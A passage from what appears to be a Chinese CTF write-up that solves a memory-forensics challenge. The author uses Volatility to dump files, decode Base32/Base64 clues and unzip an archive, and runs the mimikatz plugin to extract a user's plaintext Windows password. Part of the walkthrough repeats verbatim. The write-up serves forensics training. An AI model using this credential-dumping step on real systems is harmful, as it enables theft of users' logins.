Yusa-PC.raw --profile = Win7SP1x64 filescan | grep StickyNotes.snt Volatility Foundation Volatility Framework 2 .6 0x000000003fb306e0 16 1 RW-r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\A ppData \\R oaming \\M icrosoft \\S ticky Notes \\S tickyNotes.snt $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 dumpfiles -Q 0x000000003fb306e0 -D . Volatility Foundation Volatility Framework 2 .6 DataSectionObject 0x3fb306e0 None \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\A ppData \\R oaming \\M icrosoft \\S ticky Notes \\S tickyNotes.snt Linux \u4e0b\u4e0d\u80fd\u76f4\u63a5\u67e5\u770b SNT \u6587\u4ef6\uff0c\u5148\u4f7f\u7528 7zip \u89e3\u538b\u3002\u627e\u5230\u6587\u4ef6\u540d\u4e3a 0 \u7684\u6587\u4ef6\uff0c\u6dfb\u52a0 .rtf \u540e\u7f00\uff0c\u6253\u5f00\u540e\u5f97\u5230\uff1a \u7ec8\u4e8e\u62ff\u5230\u4e86\u7ec4\u7ec7\u7684\u6838\u5fc3\u5bc6\u7801\uff0c\u6211\u4e0d\u60f3\u518d\u5f53\u5367\u5e95\u4e86\uff0c\u6211\u60f3\u8d76\u7d27\u79bb\u5f00\u8fd9\u4e2a\u9b3c\u5730\u65b9\u3002\u6838\u5fc3\u5bc6\u7801\u662f\uff1a\u4e16\u754c\u6ca1\u4e86\u5fc3\u8df3\u3002 \uff0c\u53ef\u60dc\u4e0d\u662f\u7528\u5728 Who_am_I.zip \u4e0a\u7684\uff0c\u7ee7\u7eed\u5206\u6790 Yusa-PC.raw \u7ec4\u7ec7\u540d\u4e3a Sakura \uff0c\u770b\u770b\u6709\u6ca1\u6709\u76f8\u5173\u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 filescan | grep Sakura Volatility Foundation Volatility Framework 2 .6 0x000000003e58ada0 1 0 R--r-- \\D evice \\H arddiskVolume2 \\P rogram Files \\M SBuild \\M icrosoft \\W indows Workflow Foundation \\S akura-didi 0x000000003e78c6a0 1 0 R--r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-\u516c\u544a 0x000000003f2ae290 1 0 R--r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-egg5 0x000000003f959980 1 0 R--r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-\u5907\u5fd8\u5f55 0x000000003faa3a20 2 0 RW-rw- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\A ppData \\R oaming \\M icrosoft \\W indows \\R ecent \\S akura\u6587\u4ef6.lnk 0x000000003fabc220 1 0 R--r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-logo # \u5148\u770b\u770b\u516c\u544a $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 dumpfiles -Q 0x000000003e78c6a0 -D . Volatility Foundation Volatility Framework 2 .6 DataSectionObject 0x3e78c6a0 None \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-\u516c\u544a $ cat Sakura-\u516c\u544a | iconv -f gbk \u5168\u4f53\u6210\u5458\u6ce8\u610f\uff0c\u6211\u4eec\u5c06\u572811\u670820\u53f7\uff0c\u5bf9\u5730\u7403\u53d1\u8d77\u603b\u653b\uff0c\u8bf7\u505a\u597d\u51c6\u5907\u3002 # \u6ca1\u5565\u5185\u5bb9...\u4e0b\u4e00\u4e2a $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 dumpfiles -Q 0x000000003f959980 -D . Volatility Foundation Volatility Framework 2 .6 DataSectionObject 0x3f959980 None \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-\u5907\u5fd8\u5f55 $ cat Sakura-\u5907\u5fd8\u5f55 | iconv -f gbk 2021 .11.15\uff1a\u8bf7\u7ec4\u7ec7\u5185\u7684\u4eba\u52a1\u5fc5\u5220\u9664\u6240\u6709\u4e0d\u5fc5\u8981\u7684\u8054\u7cfb\u65b9\u5f0f\uff0c\u9632\u6b62\u6211\u4eec\u7684\u8ba1\u5212\u51fa\u73b0\u95ee\u9898\u3002 # \u518d\u770b\u770b didi -> \u662f\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 dumpfiles -Q 0x000000003e58ada0 -D . Volatility Foundation Volatility Framework 2 .6 DataSectionObject 0x3e58ada0 None \\D evice \\H arddiskVolume2 \\P rogram Files \\M SBuild \\M icrosoft \\W indows Workflow Foundation \\S akura-didi \u65e2\u7136\u63d0\u5230\u4e86\u300c\u8054\u7cfb\u65b9\u5f0f\u300d\uff0c\u5c31\u518d\u63a2\u7d22\u4e00\u4e0b 1 2 3 4 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 filescan | grep contact Volatility Foundation Volatility Framework 2 .6 0x000000003e748f20 1 0 R--r-d \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\C ontacts \\Y usa.contact 0x000000003fa09070 1 0 R--r-d \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\C ontacts \\M ystery Man.contact \u5728 Mystery Man.contact \u4e2d\u6709\u8fd9\u4e48\u4e00\u6bb5\u5f88\u53ef\u7591 1 LF2XGYPPXSGOPO4E465YPZMITLSYRGXGWS7OJOEL42O2LZFYQDSLRKXEXO56LCVB566IZ2FPW7S37K7HQK46LLUM42EJB354RTSL3IHFR6VONHEJ4S4ITZNEVHTJPNXJS62OHAECGZGCWWRVOBUXMNKMGJTTKTDZME2TKU3PGVMWS5ZVGVYUKYJSKY2TON3ZJU2VSK3WGVGHK3BVGVJW6NLBGZCDK33NKQ2WE6KBGU3XKRJVG52UQNJXOVNDKTBSM42TK4KFGVRGK3BVLFLTGNBUINBTKYTFNQ2VSVZTGVNEOOJVLJBU4NKMGZSDKNCXNY2UY4KHGVGHSZZVG52WMNSLMVCTKWLJLI2DIQ2DMEZFMNJXG54WCT2EJF3VSV2NGVGW2SJVLJVFKNCNKRIXSWLNJJUVS6SJGNMTERLZJ5KFM3KNK5HG2TSEM46Q ==== \u5148 Base32 \u89e3\u7801\uff0c\u518d Base64 1 2 3 4 $ echo LF2XGYPPXSGOPO4E465YPZMITLSYRGXGWS7OJOEL42O2LZFYQDSLRKXEXO56LCVB566IZ2FPW7S37K7HQK46LLUM42EJB354RTSL3IHFR6VONHEJ4S4ITZNEVHTJPNXJS62OHAECGZGCWWRVOBUXMNKMGJTTKTDZME2TKU3PGVMWS5ZVGVYUKYJSKY2TON3ZJU2VSK3WGVGHK3BVGVJW6NLBGZCDK33NKQ2WE6KBGU3XKRJVG52UQNJXOVNDKTBSM42TK4KFGVRGK3BVLFLTGNBUINBTKYTFNQ2VSVZTGVNEOOJVLJBU4NKMGZSDKNCXNY2UY4KHGVGHSZZVG52WMNSLMVCTKWLJLI2DIQ2DMEZFMNJXG54WCT2EJF3VSV2NGVGW2SJVLJVFKNCNKRIXSWLNJJUVS6SJGNMTERLZJ5KFM3KNK5HG2TSEM46Q ==== | base32 -d Yusa\uff0c\u7ec4\u7ec7\u521a\u521a\u6d3e\u4e0b\u6765\u4e00\u4e2a\u4efb\u52a1\uff0c\u8bf7\u5feb\u70b9\u5b8c\u6210\uff0c\u4f60\u53ea\u6709\u4e09\u5929\u65f6\u95f4\u30026L+Z5piv5L2g5Lya55So5Yiw55qEa2V577yM5Y+v5Lul55So5a6D5omT5byA57uE57uH57uZ5L2g55qE5bel5YW344CC5bel5YW35ZG95ZCN5L6d54Wn5LqG5Lyg57uf6KeE5YiZ44CCa2V577yaODIwYWM5MmI5ZjU4MTQyYmJiYzI3Y2EyOTVmMWNmNDg = $ echo 6L+Z5piv5L2g5Lya55So5Yiw55qEa2V577yM5Y+v5Lul55So5a6D5omT5byA57uE57uH57uZ5L2g55qE5bel5YW344CC5bel5YW35ZG95ZCN5L6d54Wn5LqG5Lyg57uf6KeE5YiZ44CCa2V577yaODIwYWM5MmI5ZjU4MTQyYmJiYzI3Y2EyOTVmMWNmNDg = | base64 -d \u8fd9\u662f\u4f60\u4f1a\u7528\u5230\u7684key\uff0c\u53ef\u4ee5\u7528\u5b83\u6253\u5f00\u7ec4\u7ec7\u7ed9\u4f60\u7684\u5de5\u5177\u3002\u5de5\u5177\u547d\u540d\u4f9d\u7167\u4e86\u4f20\u7edf\u89c4\u5219\u3002key\uff1a820ac92b9f58142bbbc27ca295f1cf48 \u7ec4\u7ec7\u7ed9\u4f60\u7684\u5de5\u5177 \uff1f\u60f3\u5fc5\u662f Sakura-didi \u4e86\uff0c\u89e3\u538b\u5f97\u5230 key.bmp \uff0c\u6682\u65f6\u8fd8\u5206\u6790\u4e0d\u51fa\u5565TAT \u65e2\u7136\u6709 key \uff0c\u518d\u770b\u770b\u8fd8\u6709\u6ca1\u6709\u538b\u7f29\u5305\u5427\uff01\u679c\u7136\u6709\uff01\\(\u03a6\u03c9\u03a6)/ 1 2 3 4 5 6 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 filescan | grep zip Volatility Foundation Volatility Framework 2 .6 0x000000003e444a60 15 0 R--r-d \\D evice \\H arddiskVolume2 \\W indows \\S ystem32 \\z ipfldr.dll 0x000000003ee522e0 16 0 R--r-d \\D evice \\H arddiskVolume2 \\P rogram Files \\V Mware \\V Mware Tools \\z ip.exe 0x000000003f2f49e0 15 0 R--r-- \\D evice \\H arddiskVolume2 \\P rogram Files \\V Mware \\V Mware Tools \\z ip.exe 0x000000003f3356f0 1 0 R--rw- \\D evice \\H arddiskVolume2 \\P ROGRA~1 \\M SBuild \\M ICROS~1 \\W INDOW~1 \\k ey.zip \u4f7f\u7528 \u4e16\u754c\u6ca1\u4e86\u5fc3\u8df3 \u89e3\u538b\uff0c\u7531\u4e8e Linux \u548c Windows \u7684\u7f16\u7801\u4e0d\u540c\uff0c\u9700\u8981\u7279\u522b\u6ce8\u610f\u4f7f\u7528\u4e2d\u6587\u52a0\u5bc6\u7684\u538b\u7f29\u5305 1 2 3 $ unzip -P \" $( echo -n \u4e16\u754c\u6ca1\u4e86\u5fc3\u8df3 | iconv -f utf-8 -t gbk ) \" key.zip Archive: key.zip inflating: exp \u7ec8\u4e8e\u548c Who_am_I.zip \u6709\u5173\u7cfb\u4e86\uff01\u4f46\u662f\u8fd8\u8981\u5148\u89e3\u5bc6 TAT exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from PIL import Image import struct pic = Image . open ( 'key.bmp' ) fp = open ( 'flag' , 'rb' ) fs = open ( 'Who_am_I' , 'wb' ) a , b = pic . size list1 = [] for y in range ( b ): for x in range ( a ): pixel = pic . getpixel (( x , y )) list1 . extend ([ pixel [ 1 ], pixel [ 0 ], pixel [ 2 ], pixel [ 2 ], pixel [ 1 ], pixel [ 0 ]]) data = fp . read () for i in range ( 0 , len ( data )): fs . write ( struct . pack ( 'B' , data [ i ] ^ list1 [ i % a * b * 6 ])) fp . close () fs . close () \u53ea\u80fd\u770b\u770b\u7cfb\u7edf\u8d26\u53f7\u5bc6\u7801\u4e86\uff0c YusaYusa520 \u89e3\u5bc6 Who_am_I.zip 1 2 3 4 5 $ python vol.py mimikatz -f ../Yusa\u7684\u79d8\u5bc6/Yusa-PC.raw --profile = Win7SP1x64 Module User Domain Password -------- ---------------- ---------------- ---------------------------------------- wdigest Yusa YUSA-PC YusaYusa520 wdigest YUSA-PC$ WORKGROUP \u7a0d\u5fae\u6539\u6539 exp \u5c31\u53ef\u4ee5\u89e3\u51fa flag \uff0c\u662f GIF \u5176\u4e2d\u4e00\u5e27\u6709 Flag\uff0c\u63d0\u53d6\u51fa\u6765\u5373\u53ef~ \u53c2\u8003\u8d44\u6599 \u00b6 Volatility Usage \u00b7 volatilityfoundation/volatility Wiki","title":"Yusa\u7684\u79d8\u5bc6"},{"location":"misc/yusa_secret/#_1","text":"Sakura\u7ec4\u7ec7\u5373\u5c06\u8fdb\u653b\u5730\u7403\uff0c\u6b64\u65f6\u4f60\u610f\u5916\u5f97\u5230\u4e86\u8be5\u7ec4\u7ec7\u5185\u67d0\u4e2a\u6210\u5458\u7684\u7535\u8111\u6587\u4ef6\uff0c\u4f60\u80fd\u4ece\u4e2d\u53d1\u73b0\u672c\u6b21\u9634\u8c0b\u6240\u7528\u7684\u5173\u952e\u9053\u5177\u5417\u3002\uff08\u6ce8\uff1a\u9898\u76ee\u4e2d\u5305\u542b\u4e86\u4e94\u4e2a\u5f69\u86cb\uff0c\u4e14\u5f69\u86cb\u5bf9\u89e3\u9898\u672c\u8eab\u6ca1\u6709\u4efb\u4f55\u5f71\u54cd\uff0c\u5feb\u53bb\u53d1\u73b0\u5427\uff01\uff09","title":"\u9898\u76ee"},{"location":"misc/yusa_secret/#_2","text":"Who_am_I.zip \u89e3\u538b\u9700\u8981\u5bc6\u7801\uff0c\u6682\u4e14\u653e\u5230\u4e00\u8fb9\uff0c\u5148\u5206\u6790 Yusa-PC.raw 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 # \u67e5\u770b\u76ee\u6807\u7cfb\u7edf\u4fe1\u606f $ volatility -f Yusa-PC.raw imageinfo Volatility Foundation Volatility Framework 2 .6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile ( s ) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 ... # \u67e5\u770b\u547d\u4ee4\u884c\u5386\u53f2\u8bb0\u5f55\uff0c\u53ea\u6709\u4e00\u4e2a\u5f69\u86cb\uff1ayusa\u59d0\u59d0\u6709\u597d\u591a\u597d\u591a\u7684\u5c0f\u5a07\u59bb\uff0c\u6e23\u7537 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 cmdscan Volatility Foundation Volatility Framework 2 .6 ************************************************** CommandProcess: conhost.exe Pid: 1344 CommandHistory: 0x3ffde0 Application: cmd.exe Flags: Allocated, Reset CommandCount: 1 LastAdded: 0 LastDisplayed: 0 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x5c Cmd #0 @ 0x3ea130: egg4 eXVzYeWnkOWnkOacieWlveWkmuWlveWkmueahOWwj+Woh+Wmu++8jOa4o+eUtw== Cmd #37 @ 0x3f61c0: > Cmd #38 @ 0x380158: ? ************************************************** CommandProcess: conhost.exe Pid: 1356 CommandHistory: 0x3afde0 Application: DumpIt.exe Flags: Allocated CommandCount: 0 LastAdded: -1 LastDisplayed: -1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x5c # \u67e5\u770b\u8fdb\u7a0b\u5217\u8868\uff0c\u6ce8\u610f\u5230 StikyNot.exe\uff0c\u4fbf\u7b7e\u91cc\u5e94\u8be5\u4f1a\u5b58\u6709\u4fe1\u606f $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 pslist Volatility Foundation Volatility Framework 2 .6 Offset ( V ) Name PID PPID Thds Hnds Sess Wow64 Start Exit ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0xfffffa80024bdae0 System 4 0 97 598 ------ 0 2021 -10-28 03 :46:58 UTC+0000 0xfffffa8002ecdb30 smss.exe 244 4 2 29 ------ 0 2021 -10-28 03 :46:58 UTC+0000 0xfffffa8003950340 csrss.exe 336 320 9 483 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003adfb30 wininit.exe 388 320 3 77 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003ae15d0 csrss.exe 396 380 10 328 1 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003b008f0 winlogon.exe 432 380 5 118 1 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003b6e1d0 services.exe 488 388 7 212 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003b04b30 lsass.exe 504 388 6 596 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003b03a10 lsm.exe 512 388 10 142 0 0 2021 -10-28 03 :46:59 UTC+0000 0xfffffa8003bfe9f0 svchost.exe 620 488 10 360 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003c1ab30 vmacthlp.exe 680 488 3 53 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003c46b30 svchost.exe 712 488 9 270 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003c763e0 svchost.exe 772 488 21 502 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003ca4b30 svchost.exe 856 488 16 375 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003cb5830 svchost.exe 884 488 41 1024 0 0 2021 -10-28 03 :47:00 UTC+0000 0xfffffa8003d703a0 svchost.exe 348 488 13 343 0 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003d9a6e0 svchost.exe 984 488 13 382 0 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003e34910 spoolsv.exe 1212 488 12 275 0 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003e49470 taskhost.exe 1244 488 9 227 1 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003e64b30 svchost.exe 1272 488 17 332 0 0 2021 -10-28 03 :47:01 UTC+0000 0xfffffa8003f16630 svchost.exe 1408 488 15 239 0 0 2021 -10-28 03 :47:02 UTC+0000 0xfffffa8003f57b30 VGAuthService. 1468 488 3 86 0 0 2021 -10-28 03 :47:02 UTC+0000 0xfffffa8003f8f060 vmtoolsd.exe 1520 488 10 269 0 0 2021 -10-28 03 :47:02 UTC+0000 0xfffffa8004077b30 sppsvc.exe 1736 488 4 157 0 0 2021 -10-28 03 :47:02 UTC+0000 0xfffffa80040af890 svchost.exe 1836 488 6 93 0 0 2021 -10-28 03 :47:03 UTC+0000 0xfffffa80040b3560 WmiPrvSE.exe 1908 620 10 214 0 0 2021 -10-28 03 :47:03 UTC+0000 0xfffffa8004112520 msdtc.exe 308 488 12 144 0 0 2021 -10-28 03 :47:05 UTC+0000 0xfffffa8003e55810 dwm.exe 2260 856 5 243 1 0 2021 -10-28 03 :47:08 UTC+0000 0xfffffa8003ddeb30 explorer.exe 2276 2252 45 1400 1 0 2021 -10-28 03 :47:08 UTC+0000 0xfffffa80042804b0 vmtoolsd.exe 2380 2276 8 220 1 0 2021 -10-28 03 :47:09 UTC+0000 0xfffffa8004322890 SearchIndexer. 2552 488 13 796 0 0 2021 -10-28 03 :47:13 UTC+0000 0xfffffa8002954b30 svchost.exe 1232 488 13 323 0 0 2021 -10-28 03 :49:04 UTC+0000 0xfffffa80030cb260 wmpnetwk.exe 2792 488 9 221 0 0 2021 -10-28 03 :49:04 UTC+0000 0xfffffa8003c8b460 StikyNot.exe 2228 2276 8 210 1 0 2021 -10-28 10 :37:08 UTC+0000 0xfffffa8003ad2b30 taskhost.exe 2160 488 5 101 1 0 2021 -10-29 04 :10:23 UTC+0000 0xfffffa8003cca750 cmd.exe 2536 2276 1 19 1 0 2021 -10-29 04 :15:14 UTC+0000 0xfffffa8003b1d920 conhost.exe 1344 396 2 58 1 0 2021 -10-29 04 :15:14 UTC+0000 0xfffffa8002b49060 audiodg.exe 2744 772 6 141 0 0 2021 -10-29 05 :42:04 UTC+0000 0xfffffa800282e590 dllhost.exe 1168 620 28 354 1 0 2021 -10-29 05 :42:32 UTC+0000 0xfffffa8002d0a920 wab.exe 2448 820 8 154 1 0 2021 -10-29 05 :43:20 UTC+0000 0xfffffa80028b2b30 DumpIt.exe 820 2276 1 25 1 1 2021 -10-29 05 :43:42 UTC+0000 0xfffffa8003042b30 conhost.exe 1356 396 2 59 1 0 2021 -10-29 05 :43:42 UTC+0000 0xfffffa8002841060 dllhost.exe 1000 620 6 7536754 1 0 2021 -10-29 05 :44:04 UTC+0000 StikyNot.exe \u5bf9\u5e94\u6570\u636e\u6587\u4ef6 StickyNotes.snt \uff0c\u67e5\u627e\u5e76\u4e0b\u8f7d\u5230\u672c\u673a 1 2 3 4 5 6 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 filescan | grep StickyNotes.snt Volatility Foundation Volatility Framework 2 .6 0x000000003fb306e0 16 1 RW-r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\A ppData \\R oaming \\M icrosoft \\S ticky Notes \\S tickyNotes.snt $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 dumpfiles -Q 0x000000003fb306e0 -D . Volatility Foundation Volatility Framework 2 .6 DataSectionObject 0x3fb306e0 None \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\A ppData \\R oaming \\M icrosoft \\S ticky Notes \\S tickyNotes.snt Linux \u4e0b\u4e0d\u80fd\u76f4\u63a5\u67e5\u770b SNT \u6587\u4ef6\uff0c\u5148\u4f7f\u7528 7zip \u89e3\u538b\u3002\u627e\u5230\u6587\u4ef6\u540d\u4e3a 0 \u7684\u6587\u4ef6\uff0c\u6dfb\u52a0 .rtf \u540e\u7f00\uff0c\u6253\u5f00\u540e\u5f97\u5230\uff1a \u7ec8\u4e8e\u62ff\u5230\u4e86\u7ec4\u7ec7\u7684\u6838\u5fc3\u5bc6\u7801\uff0c\u6211\u4e0d\u60f3\u518d\u5f53\u5367\u5e95\u4e86\uff0c\u6211\u60f3\u8d76\u7d27\u79bb\u5f00\u8fd9\u4e2a\u9b3c\u5730\u65b9\u3002\u6838\u5fc3\u5bc6\u7801\u662f\uff1a\u4e16\u754c\u6ca1\u4e86\u5fc3\u8df3\u3002 \uff0c\u53ef\u60dc\u4e0d\u662f\u7528\u5728 Who_am_I.zip \u4e0a\u7684\uff0c\u7ee7\u7eed\u5206\u6790 Yusa-PC.raw \u7ec4\u7ec7\u540d\u4e3a Sakura \uff0c\u770b\u770b\u6709\u6ca1\u6709\u76f8\u5173\u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 filescan | grep Sakura Volatility Foundation Volatility Framework 2 .6 0x000000003e58ada0 1 0 R--r-- \\D evice \\H arddiskVolume2 \\P rogram Files \\M SBuild \\M icrosoft \\W indows Workflow Foundation \\S akura-didi 0x000000003e78c6a0 1 0 R--r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-\u516c\u544a 0x000000003f2ae290 1 0 R--r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-egg5 0x000000003f959980 1 0 R--r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-\u5907\u5fd8\u5f55 0x000000003faa3a20 2 0 RW-rw- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\A ppData \\R oaming \\M icrosoft \\W indows \\R ecent \\S akura\u6587\u4ef6.lnk 0x000000003fabc220 1 0 R--r-- \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-logo # \u5148\u770b\u770b\u516c\u544a $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 dumpfiles -Q 0x000000003e78c6a0 -D . Volatility Foundation Volatility Framework 2 .6 DataSectionObject 0x3e78c6a0 None \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-\u516c\u544a $ cat Sakura-\u516c\u544a | iconv -f gbk \u5168\u4f53\u6210\u5458\u6ce8\u610f\uff0c\u6211\u4eec\u5c06\u572811\u670820\u53f7\uff0c\u5bf9\u5730\u7403\u53d1\u8d77\u603b\u653b\uff0c\u8bf7\u505a\u597d\u51c6\u5907\u3002 # \u6ca1\u5565\u5185\u5bb9...\u4e0b\u4e00\u4e2a $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 dumpfiles -Q 0x000000003f959980 -D . Volatility Foundation Volatility Framework 2 .6 DataSectionObject 0x3f959980 None \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\D esktop \\S akura\u6587\u4ef6 \\S akura-\u5907\u5fd8\u5f55 $ cat Sakura-\u5907\u5fd8\u5f55 | iconv -f gbk 2021 .11.15\uff1a\u8bf7\u7ec4\u7ec7\u5185\u7684\u4eba\u52a1\u5fc5\u5220\u9664\u6240\u6709\u4e0d\u5fc5\u8981\u7684\u8054\u7cfb\u65b9\u5f0f\uff0c\u9632\u6b62\u6211\u4eec\u7684\u8ba1\u5212\u51fa\u73b0\u95ee\u9898\u3002 # \u518d\u770b\u770b didi -> \u662f\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 dumpfiles -Q 0x000000003e58ada0 -D . Volatility Foundation Volatility Framework 2 .6 DataSectionObject 0x3e58ada0 None \\D evice \\H arddiskVolume2 \\P rogram Files \\M SBuild \\M icrosoft \\W indows Workflow Foundation \\S akura-didi \u65e2\u7136\u63d0\u5230\u4e86\u300c\u8054\u7cfb\u65b9\u5f0f\u300d\uff0c\u5c31\u518d\u63a2\u7d22\u4e00\u4e0b 1 2 3 4 $ volatility -f Yusa-PC.raw --profile = Win7SP1x64 filescan | grep contact Volatility Foundation Volatility Framework 2 .6 0x000000003e748f20 1 0 R--r-d \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\C ontacts \\Y usa.contact 0x000000003fa09070 1 0 R--r-d \\D evice \\H arddiskVolume2 \\U sers \\Y usa \\C ontacts \\M ystery Man.contact \u5728 Mystery Man.contact \u4e2d\u6709\u8fd9\u4e48\u4e00\u6bb5\u5f88\u53ef\u7591 1 LF2XGYPPXSGOPO4E465YPZMITLSYRGXGWS7OJOEL42O2LZFYQDSLRKXEXO56LCVB566IZ2FPW7S37K7HQK46LLUM42EJB354RTSL3IHFR6VONHEJ4S4ITZNEVHTJPNXJS62OHAECGZGCWWRVOBUXMNKMGJTTKTDZME2TKU3PGVMWS5ZVGVYUKYJSKY2TON3ZJU2VSK3WGVGHK3BVGVJW6NLBGZCDK33NKQ2WE6KBGU3XKRJVG52UQNJXOVNDKTBSM42TK4KFGVRGK3BVLFLTGNBUINBTKYTFNQ2VSVZTGVNEOOJVLJBU4NKMGZSDKNCXNY2UY4KHGVGHSZZVG52WMNSLMVCTKWLJLI2DIQ2DMEZFMNJXG54WCT2EJF3VSV2NGVGW2SJVLJVFKNCNKRIXSWLNJJUVS6SJGNMTERLZJ5KFM3KNK5HG2TSEM46Q ==== \u5148 Base32 \u89e3\u7801\uff0c\u518d Base64 1 2 3 4 $ echo LF2XGYPPXSGOPO4E465YPZMITLSYRGXGWS7OJOEL42O2LZFYQDSLRKXEXO56LCVB566IZ2FPW7S37K7HQK46LLUM42EJB354RTSL3IHFR6VONHEJ4S4ITZNEVHTJPNXJS62OHAECGZGCWWRVOBUXMNKMGJTTKTDZME2TKU3PGVMWS5ZVGVYUKYJSKY2TON3ZJU2VSK3WGVGHK3BVGVJW6NLBGZCDK33NKQ2WE6KBGU3XKRJVG52UQNJXOVNDKTBSM42TK4KFGVRGK3BVLFLTGNBUINBTKYTFNQ2VSVZTGVNEOOJVLJBU4NKMGZSDKNCXNY2UY4KHGVGHSZZVG52WMNSLMVCTKWLJLI2DIQ2DMEZFMNJXG54WCT2EJF3VSV2NGVGW2SJVLJVFKNCNKRIXSWLNJJUVS6SJGNMTERLZJ5KFM3KNK5HG2TSEM46Q ==== | base32 -d Yusa\uff0c\u7ec4\u7ec7\u521a\u521a\u6d3e\u4e0b\u6765\u4e00\u4e2a\u4efb\u52a1\uff0c\u8bf7\u5feb\u70b9\u5b8c\u6210\uff0c\u4f60\u53ea\u6709\u4e09\u5929\u65f6\u95f4\u30026L+Z5piv5L2g5Lya55So5Yiw55qEa2V577yM5Y+v5Lul55So5a6D5omT5byA57uE57uH57uZ5L2g55qE5bel5YW344CC5bel5YW35ZG95ZCN5L6d54Wn5LqG5Lyg57uf6KeE5YiZ44CCa2V577yaODIwYWM5MmI5ZjU4MTQyYmJiYzI3Y2EyOTVmMWNmNDg = $ echo 6L+Z5piv5L2g5Lya55So5Yiw55qEa2V577yM5Y+v5Lul55So5a6D5omT5byA57uE57uH57uZ5L2g55qE5bel5YW344CC5bel5YW35ZG95ZCN5L6d54Wn5LqG5Lyg57uf6KeE5YiZ44CCa2V577yaODIwYWM5MmI5ZjU4MTQyYmJiYzI3Y2EyOTVmMWNmNDg = | base64 -d \u8fd9\u662f\u4f60\u4f1a\u7528\u5230\u7684key\uff0c\u53ef\u4ee5\u7528\u5b83\u6253\u5f00\u7ec4\u7ec7\u7ed9\u4f60\u7684\u5de5\u5177\u3002\u5de5\u5177\u547d\u540d\u4f9d\u7167\u4e86\u4f20\u7edf\u89c4\u5219\u3002key\uff1a820ac92b9f58142bbbc27ca295f1cf48 \u7ec4\u7ec7\u7ed9\u4f60\u7684\u5de5\u5177 \uff1f\u60f3\u5fc5\u662f Sakura-didi \u4e86\uff0c\u89e3\u538b\u5f97\u5230 key.bmp \uff0c\u6682\u65f6\u8fd8\u5206\u6790\u4e0d\u51fa\u5565TAT \u65e2\u7136\u6709 key 